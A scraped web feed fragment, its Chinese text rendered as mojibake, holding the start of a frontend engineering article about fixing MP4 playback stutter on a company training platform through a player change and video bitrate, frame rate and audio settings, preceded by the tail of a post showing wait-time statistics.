waited due the total <span class="hljs-attr">size</span> = <span class="hljs-number">0</span><span class="hljs-comment">; è¶…è¿‡æœ€å¤§sizeçš„æ¬¡æ•°</span>
waited at clock <span class="hljs-attr">conflicts</span>= <span class="hljs-number">6918018179200</span><span class="hljs-comment">;å› ä¸ºé€»è¾‘æ—¶é—´äº§ç”Ÿå†²çªçš„ç­‰å¾…æ—¶é—´ï¼Œå•ä½æ˜¯çº³ç§’</span>
waited (count) when Workers <span class="hljs-attr">occupied</span> = <span class="hljs-number">0</span> å› ä¸ºworkderè¢«å ç”¨è€Œå‡ºç°ç­‰å¾…çš„æ¬¡æ•°ã€‚ï¼ˆæ€»è®¡å€¼ï¼‰
waited when Workers <span class="hljs-attr">occupied</span> = <span class="hljs-number">0</span> å› ä¸ºworkderè¢«å ç”¨è€Œå‡ºç°ç­‰å¾…çš„æ€»æ—¶é—´ï¼Œæ€»è®¡å€¼ï¼Œå•ä½æ˜¯çº³ç§’
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[HLS æµåª’ä½“æŠ€æœ¯ï¼šç•…äº«é«˜æ¸…è§†é¢‘ï¼Œå¿˜å´ MP4 å¡é¡¿çš„çƒ¦æ¼ï¼]]></title>    <link>https://juejin.cn/post/7592540388297900095</link>    <guid>https://juejin.cn/post/7592540388297900095</guid>    <pubDate>2026-01-08T03:16:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592540388297900095" data-draft-id="7592410399918374953" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="HLS æµåª’ä½“æŠ€æœ¯ï¼šç•…äº«é«˜æ¸…è§†é¢‘ï¼Œå¿˜å´ MP4 å¡é¡¿çš„çƒ¦æ¼ï¼"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T03:16:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è½¬è½¬æŠ€æœ¯å›¢é˜Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/606586148237431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            HLS æµåª’ä½“æŠ€æœ¯ï¼šç•…äº«é«˜æ¸…è§†é¢‘ï¼Œå¿˜å´ MP4 å¡é¡¿çš„çƒ¦æ¼ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/606586148237431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è½¬è½¬æŠ€æœ¯å›¢é˜Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:16:49.000Z" title="Thu Jan 08 2026 03:16:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»15åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>åœ¨è½¬è½¬å­¦å ‚è¿™ä¸ªå­¦ä¹ å¹³å°ä¸­ï¼Œæä¾›äº†ä¸Šé—¨ã€é—¨åº—å’Œè´¨æ£€ä¸­å¿ƒç­‰åŸ¹è®­è§†é¢‘è¯¾ç¨‹ï¼Œæ»¡è¶³äº†å„ä¸šåŠ¡éœ€æ±‚ã€‚ä½œä¸ºå…¨ä½“å‘˜å·¥å­¦ä¹ çš„ä¸»è¦æ¸ é“ä¹‹ä¸€ï¼Œå¹³å°æ¶‰åŠäº†è¶…è¿‡ 3000 äººï¼Œå¤§å¤šæ•°ä¸šåŠ¡ç›¸å…³çš„è§†é¢‘è¯¾ç¨‹éƒ½å°†åœ¨è¯¥å¹³å°ä¸Šè¿›è¡Œå­¦ä¹ ï¼Œå› æ­¤è¯¥å¹³å°çš„è§†é¢‘æ’­æ”¾ä½“éªŒé—®é¢˜ä¹Ÿè‡³å…³é‡è¦ã€‚</p>
<p>è¿‡å»æ²¡æœ‰ä¸“é—¨æŠ½ç©ºå»æ¢³ç†ï¼Œä»Šå¤©åˆšå¥½æœ‰æœºä¼šï¼Œå›é¡¾è¿‡å»åŠæ¢³ç†ä¸€ä¸‹è·Ÿå¤§å®¶åˆ†äº«ä¸€ä¸‹ã€‚æ¥ä¸‹æ¥ï¼Œè®²ä¸€ä¸‹æˆ‘ä»¬åœ¨è§†é¢‘æ’­æ”¾ä¸Šé‡åˆ°çš„é—®é¢˜åŠå¦‚ä½•ä¸€æ­¥æ­¥è§£å†³çš„ã€‚</p>
<h2 data-id="heading-1">è¿‡å»é—®é¢˜</h2>
<p>åœ¨å­¦å ‚ä¸Šçº¿ä¹‹åï¼Œæ—¶ä¸æ—¶æœ‰äººåé¦ˆè§†é¢‘æ’­æ”¾æ¯”è¾ƒå¡ã€‚èµ·åˆï¼Œæˆ‘ä»¬è§‰çš„è¿™ä¸ªå¡é¡¿è·Ÿæˆ‘ä»¬æ²¡å¤ªå¤šå…³ç³»ï¼Œç”¨çš„æ’­æ”¾å™¨éƒ½æ˜¯æµè§ˆå™¨å†…ç½®çš„ï¼Œæ²¡åŠæ³•å¹²æ¶‰åˆ°åº•å±‚çš„èƒ½åŠ›ã€‚å†åæ¥ï¼Œåé¦ˆçš„æƒ…å†µè¶Šæ¥è¶Šå¤šï¼Œä¸å¾—ä¸é‡è§†èµ·æ¥ï¼Œä»¥ä¸‹æ˜¯è¿‡å»æ”¶é›†åˆ°çš„åé¦ˆä¿¡æ¯ï¼š</p>
<blockquote>
<p>é»„æŸ 1ï¼šåˆšæ‰è¿˜æœ‰ä¸šåŠ¡æ‰¾æˆ‘è¯´è§†é¢‘å¡é¡¿ã€‚<br/>
é»„æŸ 1ï¼šå­¦å ‚çš„è§†é¢‘ä»Šå¤©å‡ºç°å¡é¡¿çš„æƒ…å†µã€‚<br/>
ææŸï¼šè¿™ä¸ªä¼˜åŒ–æ—¶é—´å¤§æ¦‚å¤šä¹…å‘€ï¼Œç›®å‰è¯¾ç¨‹éƒ½ä»¥å¼€æ”¾ä½¿ç”¨ï¼Œå¡é¡¿ä¼šå½±å“æŒºå¤šä¸šåŠ¡ä½¿ç”¨çš„å“¦ã€‚<br/>
é»„æŸ 2ï¼šå¤§ä½¬ä»¬ï¼Œæƒ³é—®ä¸‹å­¦å ‚å¡é¡¿çš„é—®é¢˜ç°åœ¨æ˜¯å¦ä¼˜åŒ–äº†ï¼Œæˆ‘ä»¬è€æ¿ä»Šå¤©åˆ°å­¦å ‚ä½“éªŒçš„æ—¶å€™å‘ç°å¡é¡¿é—®é¢˜è¿˜æ˜¯å­˜åœ¨ï¼Œè¾›è‹¦å…³æ³¨ä¸‹ã€‚<br/>
äº§å“ 1ï¼šç°åœ¨è´¨æ£€çš„åœ¨ç”¨æˆ‘ä»¬çš„è§†é¢‘å­¦ä¹ ï¼Œä»–ä»¬åé¦ˆè§†é¢‘å¾ˆå¡ï¼Œå¾ˆå½±å“ä»–ä»¬çš„å­¦ä¹ æ•ˆç‡ã€‚</p>
</blockquote>
<p>è¿™æ— ç–‘ä¹Ÿç»™äºˆäº†æˆ‘ä»¬ä¸€äº›å‹åŠ›ï¼Œä¸å¤„ç†å¥½è¿™ä¸ªäº‹æƒ…çš„è¯ï¼Œåç»­æ›´å¤šäººç”¨çš„è¯ï¼Œåæ§½çš„ä¼šæ›´å¤šï¼Œæˆ‘ä»¬ä¹Ÿä¼šæ›´éš¾å ªã€‚ğŸ˜£</p>
<p>æˆ‘ä»¬çš„è§†é¢‘ç”¨çš„æ ¼å¼æ˜¯ mp4ï¼Œåœ¨æ’­æ”¾æ—¶å¸¸å‡ºç°å¡é¡¿ç°è±¡ï¼Œå°¤å…¶å¯¹äºè¾ƒå¤§çš„æ–‡ä»¶ï¼Œæ‹–åŠ¨æ—¶åŠ è½½å¡é¡¿æ›´åŠ æ˜æ˜¾ï¼Œä»¥ä¸‹æ˜¯ä¸ªæä¾›ä¸ªæ¼”ç¤ºè§†é¢‘ä¾›å¤§å®¶æ„Ÿå—ä¸€ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ac8b8ed3a404e4093e00658936ed7a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447009&amp;x-signature=I0wk1OVz5NI0wYk1hqGKoAtLleE%3D" alt="mp4-demo.gif" loading="lazy"/></p>
<h2 data-id="heading-2">è§£å†³æ–¹æ¡ˆ</h2>
<p>é’ˆå¯¹ä»¥ä¸Šä¸šåŠ¡åå¤çš„è¯´å¡é¡¿é—®é¢˜ï¼Œæˆ‘ä»¬å®åœ¨æ˜¯æ‰›ä¸ä½äº†ï¼Œäºæ˜¯ä¸‹å®šå†³å¿ƒæ˜¯è¦è§£å†³è¿™ä¸ªé—®é¢˜ã€‚æˆ‘ä»¬å…ˆåæŠ˜è…¾äº†å‡ ä¸ªæ–¹æ¡ˆï¼Œä½†æ˜¯æ•ˆæœä¸ä½³ï¼Œç›´åˆ°æœ€åä¸€ä¸ªæ–¹æ¡ˆï¼ˆå³æµåª’ä½“æ ¼å¼ï¼‰ï¼ŒåŠ ä¸Šåˆ‡æ¢å…¨æ–°çš„æ’­æ”¾å™¨ï¼Œæ‰ç®—æ˜¯è§£å†³åˆ°äº†é—®é¢˜çš„æ ¹æœ¬ï¼Œä»¥ä¸‹æ˜¯æˆ‘ä»¬æŠ˜è…¾çš„å‡ ä¸ªæ–¹æ¡ˆçš„è¿‡ç¨‹ã€‚</p>
<h3 data-id="heading-3">1. å…¨æ–°æ”¹é€ ï¼šæ­è½½è…¾è®¯äº‘ TCPlayer æ’­æ”¾å™¨</h3>
<p>ç”±äºå¯¹äºè§†é¢‘å¡é¡¿çš„åº•å±‚åŸç†ç ”ç©¶æ¯”è¾ƒæµ…ï¼Œæœ€å¼€å§‹è§‰çš„å¡é¡¿æ˜¯ä¸æ˜¯æ¢ä¸€ä¸ªæ’­æ”¾å™¨å°±å¯ä»¥å¾—ä»¥è§£å†³ï¼Œäºæ˜¯å¯¹æ¯”äº†å¸‚é¢ä¸Šçš„ä¸€äº›æ’­æ”¾å™¨ï¼Œç›¸å¯¹æ¥è¯´ï¼Œè…¾è®¯çš„ TCPlayer æ¯”è¾ƒæˆç†Ÿä¸”ç¬¦åˆå¼€å‘æ¡ä»¶ï¼Œå› æ­¤å°±å°è¯•æ”¹é€ èµ·æ¥ã€‚</p>
<p>æˆ‘ä»¬ä»å®˜ç½‘äº†è§£åˆ°ï¼ŒTCPlayer æœ‰è®¸å¤šä¼˜åŠ¿ï¼Œå…¶ä¸­ä¸»è¦å…·æœ‰ä»¥ä¸‹ç‰¹å¾ï¼š</p>
<ul>
<li>é«˜æ€§èƒ½æ’­æ”¾ï¼šTCPlayer å…·å¤‡å“è¶Šçš„æ€§èƒ½ï¼Œåœ¨å„ç§ç½‘ç»œç¯å¢ƒä¸‹æä¾›æµç•…ã€ç¨³å®šçš„è§†é¢‘æ’­æ”¾ä½“éªŒã€‚</li>
<li>å¤šæ ¼å¼æ”¯æŒï¼šTCPlayer æ”¯æŒå¤šç§å¸¸è§çš„è§†é¢‘æ ¼å¼ï¼ŒåŒ…æ‹¬ MP4ã€FLVã€HLSã€M3U8 ç­‰ï¼Œä»¥é€‚åº”ä¸åŒçš„éœ€æ±‚å’Œåœºæ™¯ã€‚</li>
<li>è‡ªé€‚åº”ç ç‡ï¼šTCPlayer æ”¯æŒè‡ªé€‚åº”ç ç‡æŠ€æœ¯ï¼Œæ ¹æ®è§‚ä¼—çš„ç½‘ç»œç¯å¢ƒåŠ¨æ€è°ƒæ•´è§†é¢‘çš„ç ç‡å’Œåˆ†è¾¨ç‡ï¼Œç¡®ä¿é«˜è´¨é‡çš„æ’­æ”¾å’Œè¾ƒä½çš„å¡é¡¿ç‡ã€‚</li>
<li>å¼ºå¤§çš„åŠŸèƒ½æ‰©å±•ï¼šTCPlayer æä¾›ä¸°å¯Œçš„åŠŸèƒ½æ‰©å±•æ¥å£å’Œæ’ä»¶æœºåˆ¶ï¼Œå¯ä»¥æ ¹æ®ä¸šåŠ¡éœ€æ±‚è¿›è¡Œçµæ´»çš„æ‹“å±•å’Œå®šåˆ¶ã€‚</li>
<li>å¤šå¹³å°å…¼å®¹ï¼šTCPlayer å¯ä»¥åœ¨å¤šä¸ªå¹³å°ä¸Šä½¿ç”¨ï¼ŒåŒ…æ‹¬ç½‘é¡µã€ç§»åŠ¨åº”ç”¨å’Œå…¶ä»–è®¾å¤‡ã€‚å®ƒæä¾›äº†é€‚é…ä¸åŒå¹³å°çš„å¼€å‘å·¥å…·å’Œæ–‡æ¡£ã€‚</li>
<li>å…¨é¢çš„æ§åˆ¶ä¸äº¤äº’ï¼šTCPlayer æ”¯æŒå…¨é¢çš„æ’­æ”¾æ§åˆ¶å’Œç”¨æˆ·äº¤äº’åŠŸèƒ½ï¼Œå¦‚æ’­æ”¾ã€æš‚åœã€è·³è½¬ã€å…¨å±ç­‰ï¼Œä½¿ç”¨æˆ·èƒ½å¤Ÿæ–¹ä¾¿åœ°æ“ä½œå’Œæ§åˆ¶è§†é¢‘æ’­æ”¾ã€‚</li>
</ul>
<p>ä»é¡µé¢ä¸Šæ˜¾ç¤ºæ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4daf85120027499c84e405ad70259017~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447009&amp;x-signature=X%2Ff9QJqUM0Xm1jAP36hNWEeA0Q0%3D" alt="æ’­æ”¾å™¨æ ·å¼" loading="lazy"/></p>
<p>äºæ˜¯å†³å®šå°† h5 æ’­æ”¾å™¨æ”¹æˆè…¾è®¯äº‘çš„æ’­æ”¾å™¨ï¼Œè°ƒç ”æµ‹è¯•äº†ä¸€ä¸‹ï¼Œé¡µé¢æ ·å¼ç¡®å®ç¾è§‚äº†å¾ˆå¤šï¼Œèƒ½å¤Ÿè§£å†³äº†è¿‡å»å¤šä¸ªç«¯æ ·å¼ä¸ä¸€è‡´çš„é—®é¢˜ã€‚ä½†ä»åº•å±‚æ¥çœ‹ï¼Œè¿˜æ˜¯æ²¡æœ‰è§£å†³æ ¹æœ¬é—®é¢˜ï¼ŒåŒæ—¶ä¹Ÿå¸¦æ¥äº†å¦å¤–ä¸€ä¸ªé—®é¢˜ä»£ç æ”¹é€ æˆæœ¬è¿‡é«˜ï¼Œéšä¹‹ä¹Ÿå¸¦æ¥ç»´æŠ¤æˆæœ¬é«˜ã€‚åŸºäºé—®é¢˜è§£å†³çš„æ€è·¯è€ƒè™‘ï¼Œæˆ‘ä»¬å°†è¿™ä¸ªæ–¹æ¡ˆæš‚å®šã€‚</p>
<p>å‚è€ƒæ–‡æ¡£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.tencent.com%2Fdocument%2Fproduct%2F454%2F7503" title="https://cloud.tencent.com/document/product/454/7503" target="_blank" ref="nofollow noopener noreferrer">ç›´æ’­ SDK Webï¼ˆTCPlayerï¼‰-æ—  UI é›†æˆæ–¹æ¡ˆ-æ–‡æ¡£ä¸­å¿ƒ-è…¾è®¯äº‘</a></p>
<h3 data-id="heading-4">2. å¼ºåŒ–ä¼˜åŒ–ï¼šä¼˜åŒ–è§†é¢‘åˆ†è¾¨ç‡ã€ç¼–ç ç­‰å‚æ•°å‡å°‘ä½“ç§¯</h3>
<p>å½’æ ¹åˆ°åº•æˆ‘ä»¬è¿˜æ˜¯æƒ³ä»è§†é¢‘çš„åº•å±‚å±æ€§ä¸Šå»åšä¸€äº›ä¼˜åŒ–ï¼Œæˆ‘ä»¬äº†è§£åˆ°è§†é¢‘ä»–æœ‰å¾ˆå¤šå¯æ§çš„å‚æ•°ï¼Œä»å¤–éƒ¨æ”¶é›†äº†ä¸€äº›ä¿¡æ¯ï¼Œå¯¹äºå½±å“è§†é¢‘æ’­æ”¾é€Ÿåº¦çš„å› ç´ æœ‰ï¼š</p>
<ul>
<li>è§†é¢‘æ¯”ç‰¹ç‡ï¼šæŒ‡è§†é¢‘æ–‡ä»¶ä¸­æ¯ç§’ä¼ è¾“çš„æ¯”ç‰¹æ•°ï¼Œé€šå¸¸ä»¥â€œæ¯”ç‰¹/ç§’â€ï¼ˆbpsï¼‰æˆ–â€œåƒæ¯”ç‰¹/ç§’â€ï¼ˆKbpsï¼‰ä¸ºå•ä½ã€‚æ¯”ç‰¹ç‡å†³å®šäº†è§†é¢‘çš„ç”»é¢è´¨é‡å’Œæ–‡ä»¶å¤§å°ï¼Œè¾ƒé«˜çš„æ¯”ç‰¹ç‡é€šå¸¸ä¼šå¸¦æ¥æ›´å¥½çš„ç”»é¢è´¨é‡ï¼Œä½†ä¼šå¯¼è‡´æ–‡ä»¶æ›´å¤§ã€‚</li>
<li>å…³é”®å¸§ï¼šå…³é”®å¸§ï¼ˆä¹Ÿç§°ä¸º I å¸§ï¼‰åœ¨è§†é¢‘ç¼–ç ä¸­èµ·ç€é‡è¦ä½œç”¨ï¼Œå®ƒä»¬æ˜¯è§†é¢‘åºåˆ—ä¸­å®Œæ•´è‡ªèº«çš„å¸§ï¼Œè€Œå…¶ä»–å¸§ï¼ˆP å¸§å’Œ B å¸§ï¼‰åˆ™æ˜¯é€šè¿‡å‚è€ƒå…¶ä»–å¸§è¿›è¡Œå‹ç¼©ç¼–ç çš„ã€‚è°ƒæ•´å…³é”®å¸§é—´éš”ä¼šå½±å“è§†é¢‘çš„å‹ç¼©æ•ˆç‡ã€ç”»é¢è´¨é‡å’Œæ’­æ”¾æ€§èƒ½ã€‚</li>
<li>å¸§ç‡ï¼šè°ƒæ•´å¸§ç‡æ˜¯æŒ‡æ›´æ”¹è§†é¢‘ä¸­æ¯ç§’æ˜¾ç¤ºçš„å¸§æ•°ã€‚è§†é¢‘å¸§ç‡æ˜¯æŒ‡æ¯ç§’æ˜¾ç¤ºçš„å›¾åƒæ•°é‡ï¼Œé€šå¸¸ä»¥â€œå¸§/ç§’â€ï¼ˆfpsï¼‰ä¸ºå•ä½ã€‚è°ƒæ•´å¸§ç‡ä¼šå½±å“è§†é¢‘æ’­æ”¾çš„æµç•…åº¦ã€è§†è§‰æ„Ÿå—ä»¥åŠæ–‡ä»¶å¤§å°ã€‚</li>
<li>éŸ³é¢‘æ¯”ç‰¹ç‡ï¼šéŸ³é¢‘æ¯”ç‰¹ç‡æ˜¯æŒ‡åœ¨éŸ³é¢‘ç¼–ç ä¸­æ¯ç§’ä¼ è¾“çš„æ¯”ç‰¹æ•°ï¼Œå®ƒä¼šç›´æ¥å½±å“éŸ³é¢‘çš„è´¨é‡å’Œæ–‡ä»¶å¤§å°ã€‚é€‰æ‹©é€‚å½“çš„éŸ³é¢‘æ¯”ç‰¹ç‡éœ€è¦ç»¼åˆè€ƒè™‘éŸ³é¢‘è´¨é‡ã€å­˜å‚¨ç©ºé—´å’Œå¸¦å®½è¦æ±‚ç­‰å› ç´ ã€‚</li>
</ul>
<p>ç»¼åˆè€ƒè™‘ä»¥ä¸Šå› ç´ ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„éŸ³é¢‘æ¯”ç‰¹ç‡é€‰æ‹©ï¼š</p>
<ul>
<li><strong>64 kbps</strong>ï¼š é€‚ç”¨äºä½å¸¦å®½ç¯å¢ƒå’Œéœ€è¦èŠ‚çœå­˜å‚¨ç©ºé—´çš„æƒ…å†µã€‚éŸ³é¢‘è´¨é‡å¯èƒ½ä¼šæœ‰æ‰€é™ä½ã€‚</li>
<li><strong>128 kbps</strong>ï¼š æ˜¯è®¸å¤šåœ¨çº¿éŸ³é¢‘å’Œè§†é¢‘å¹³å°çš„é»˜è®¤éŸ³é¢‘æ¯”ç‰¹ç‡ã€‚æä¾›äº†è¾ƒå¥½çš„éŸ³é¢‘è´¨é‡ï¼Œå¹¶ä¸”åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹èƒ½å¤Ÿæ»¡è¶³è§‚ä¼—éœ€æ±‚ã€‚</li>
<li><strong>192 kbps</strong> æˆ–æ›´é«˜ï¼š å¯¹äºéœ€è¦é«˜éŸ³è´¨çš„éŸ³é¢‘å†…å®¹ï¼Œå¦‚éŸ³ä¹æˆ–ä¸“ä¸šå½•åˆ¶ï¼Œå¯ä»¥é€‰æ‹©è¾ƒé«˜çš„æ¯”ç‰¹ç‡ã€‚</li>
<li>é‡‡æ ·ç‡ï¼šéŸ³é¢‘é‡‡æ ·ç‡æ˜¯æŒ‡åœ¨éŸ³é¢‘æ•°å­—åŒ–è¿‡ç¨‹ä¸­æ¯ç§’å¯¹åŸå§‹éŸ³é¢‘ä¿¡å·è¿›è¡Œé‡‡æ ·çš„æ¬¡æ•°ã€‚é‡‡æ ·ç‡ä¼šå½±å“éŸ³é¢‘çš„é¢‘ç‡èŒƒå›´å’Œè´¨é‡ã€‚</li>
</ul>
<p>å¸¸è§çš„éŸ³é¢‘é‡‡æ ·ç‡åŒ…æ‹¬ 44.1 kHz å’Œ 48 kHzã€‚è¿™äº›é‡‡æ ·ç‡åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹å·²ç»èƒ½å¤Ÿæä¾›è¶³å¤Ÿçš„éŸ³é¢‘è´¨é‡ã€‚</p>
<ul>
<li><strong>44.1 kHz</strong>ï¼š è¿™æ˜¯ CD éŸ³è´¨çš„æ ‡å‡†é‡‡æ ·ç‡ï¼Œè¢«å¹¿æ³›ç”¨äºéŸ³ä¹ã€è¯­éŸ³å’Œä¸€èˆ¬çš„éŸ³é¢‘å†…å®¹ã€‚è¿™ç§é‡‡æ ·ç‡èƒ½å¤Ÿæ•æ‰äººè€³æ‰€èƒ½å¬åˆ°çš„å¤§éƒ¨åˆ†é¢‘ç‡èŒƒå›´ã€‚</li>
<li><strong>48 kHz</strong>ï¼š è¿™æ˜¯è§†é¢‘åˆ¶ä½œã€å¹¿æ’­å’Œè®¸å¤šæ•°å­—éŸ³é¢‘å·¥ä½œæµä¸­å¸¸ç”¨çš„é‡‡æ ·ç‡ã€‚å®ƒå¯ä»¥é€‚åº”æ›´å¹¿æ³›çš„éŸ³é¢‘éœ€æ±‚ï¼Œå¹¶ä¸”åœ¨ä¸“ä¸šé¢†åŸŸä¸­ä½¿ç”¨è¾ƒå¤šã€‚</li>
</ul>
<p>åŸºäºä»¥ä¸Šçš„å±æ€§é…ç½®ï¼Œæˆ‘ä»¬å†…éƒ¨æµ‹è¯•äº†ä¸€ä¸‹ï¼Œæ”¹å–„é…ç½®ç¡®å®èƒ½å°†è§†é¢‘ä½“ç§¯å˜å°ï¼Œéšä¹‹åŠ è½½é€Ÿåº¦ä¹Ÿå°±ç›¸å¯¹å¿«ä¸€ç‚¹ï¼Œäºæ˜¯è·Ÿ RD ä¸€èµ·è°ƒè¯•äº†ä¸€ä¸ªç¬¦åˆæˆ‘ä»¬å¹³å°å¤Ÿç”¨çš„ä¸€ä¸ªå‚æ•°é…ç½®ï¼Œæœ€åè·Ÿä¸šåŠ¡è¾¾æˆä¸€è‡´ï¼Œåç»­ä¸Šä¼ è§†é¢‘ä¹‹å‰æ ¹æ®è¿™ä¸ªå‚æ•°è½¬ä¸€ä¸‹ç ã€‚</p>
<p>è½¬ç å·¥å…·é…ç½®å›¾ï¼š</p>
